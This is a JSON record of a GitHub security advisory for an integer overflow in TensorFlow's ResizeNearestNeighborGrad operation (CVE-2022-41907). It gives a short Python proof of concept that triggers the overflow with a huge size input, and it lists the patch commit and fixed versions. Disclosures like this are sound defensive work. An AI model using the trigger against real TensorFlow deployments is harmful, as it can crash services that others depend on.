{
    "ghsaId": "GHSA-368v-7v32-52fx",
    "severity": "MODERATE",
    "summary": "Overflow in `ResizeNearestNeighborGrad`",
    "description": "### Impact\nWhen [`tf.raw_ops.ResizeNearestNeighborGrad`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/kernels/image/resize_nearest_neighbor_op.cc) is given a large `size` input, it overflows.\n```\nimport tensorflow as tf\n\nalign_corners = True\nhalf_pixel_centers = False\ngrads = tf.constant(1, shape=[1,8,16,3], dtype=tf.float16)\nsize = tf.constant([1879048192,1879048192], shape=[2], dtype=tf.int32)\ntf.raw_ops.ResizeNearestNeighborGrad(grads=grads, size=size, align_corners=align_corners, half_pixel_centers=half_pixel_centers)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [00c821af032ba9e5f5fa3fe14690c8d28a657624](https://github.com/tensorflow/tensorflow/commit/00c821af032ba9e5f5fa3fe14690c8d28a657624).\n\nThe fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou from the Secure Systems Lab (SSL) at Brown University.\n",
    "permalink": "https://github.com/advisories/GHSA-368v-7v32-52fx",
    "publishedAt": "2022-11-21T22:04:27Z",
    "withdrawnAt": null,
    "identifiers": [
        {
            "type": "GHSA",
            "value": "GHSA-368v-7v32-52fx"
        },
        {
            "type": "CVE",
            "value": "CVE-2022-41907"
        }
    ]
}